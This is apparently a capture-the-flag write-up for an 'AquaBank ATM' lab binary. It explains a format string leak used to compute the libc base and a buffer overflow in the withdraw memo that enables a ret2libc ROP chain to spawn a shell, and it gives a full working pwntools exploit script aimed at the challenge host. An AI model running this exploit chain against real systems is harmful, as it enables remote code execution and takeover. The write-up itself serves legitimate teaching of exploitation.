## AquaBank ATM - ret2libc with Format String and BOF

We now turn our analytical focus to the AquaBank ATM laboratory exercise, which features an interactive command line banking application developed in C, where the ultimate objective demands the successful chaining of two distinct memory corruption flaws to achieve remote code execution on the target system. Upon a thorough examination of the provided source code, one will immediately notice a critical oversight within the `print_note` function, given that the application passes the globally defined `note` buffer directly to the standard output through the `printf` function without explicitly defining a format specifier. This coding malpractice introduces a severe **Format String Vulnerability**, which provides an attacker with the capability to manipulate the execution state and leak arbitrary memory values, where supplying a crafted payload such as `%1$p` compels the vulnerable program to print a pointer directly from the execution stack. By analyzing the leaked output, which reliably points to an internal structure corresponding to `_IO_2_1_stdout_` plus a constant offset of 131 bytes, an exploit developer can dynamically compute the base address of the C standard library, which fundamentally nullifies the protections afforded by Address Space Layout Randomization.

Having successfully resolved the dynamic memory layout, the assessment proceeds to the second critical flaw located within the `withdraw` function, where the developer allocated a local `memo` buffer of precisely 64 bytes but subsequently invoked the `fgets` function with a maximum read limit of 256 bytes, which inadvertently creates a textbook **Buffer Overflow** condition. Because the application fails to enforce appropriate boundary checks on user input, it becomes entirely feasible to overwrite the saved return address located on the stack, which necessitates exactly 136 bytes of padding to reach the instruction pointer. The final phase of the exploitation strategy relies on a technique known as Return Oriented Programming, where the attacker constructs a payload that first utilizes a `pop rdi` gadget to load the dynamically calculated memory address of the `/bin/sh` string into the primary argument register. This step is immediately followed by a standard `ret` instruction to satisfy the strict stack alignment requirements inherent to modern 64 bit architectures, which finally redirects execution to the `system` library function, thereby spawning an interactive command shell and granting full control over the vulnerable process.



```Python
# !/usr/bin/env python3
from pwn import *

exe = elf = ELF('./aquabank-atm', checksec=False)
context.binary = exe
context.os = 'linux'
context.arch = 'amd64'

HOST, PORT = 'offsec.m0lecon.it', 13519

OFFSET_TO_RIP = 136
ret_gadget = 0x40101a


def conn():
    if args.LOCAL:
        r = process(elf.path)
        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    else:
        r = remote(HOST, PORT)
        libc = ELF('libc.so.6', checksec=False)
    return r, libc


def main():
    p, libc = conn()

    payload_printf = b"%1$p"

    p.recvuntil(b'> ')
    p.sendline(b"1")
    p.recvuntil(b'Type your customer note: ')
    p.sendline(payload_printf)

    p.recvuntil(b'> ')
    p.sendline(b"2")
    p.recvuntil(b'--- Your customer note ---\n')

    leaked = p.recvline().strip()
    log.info(f"raw leak = {leaked}")

    leaked_addr = int(leaked, 16)
    log.info(f"leaked addr = {leaked_addr:#x}")

    SYMBOL_OFFSET = libc.symbols['_IO_2_1_stdout_'] + 131
    libc.address = leaked_addr - SYMBOL_OFFSET
    log.info(f"libc base = {libc.address:#x}")

    system_addr = libc.symbols['system']
    log.info(f"system = {system_addr:#x}")

    bin_sh_addr = next(libc.search(b"/bin/sh\x00"))
    log.info(f"/bin/sh = {bin_sh_addr:#x}")

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    log.info(f"pop rdi; ret = {pop_rdi:#x}")

    p.recvuntil(b'> ')
    p.sendline(b"3")
    p.recvuntil(b'From account: ')
    p.sendline(b"A")
    p.recvuntil(b'Amount: ')
    p.sendline(b"1")
    p.recvuntil(b'Withdrawal memo (be brief):')

    payload_bof = flat(
        b"A" * OFFSET_TO_RIP,
        pop_rdi,
        bin_sh_addr,
        ret_gadget,  
        system_addr)

    p.sendline(payload_bof)

    p.interactive()


if __name__ == "__main__":
    main()
```

> **Return to libc:** This advanced exploitation technique is utilized to circumvent hardware enforced memory protections which prevent execution on the stack, where an attacker leverages a buffer overflow to redirect the execution flow toward existing functions within the standard C library, such as the system function, thereby executing arbitrary commands without injecting novel executable code.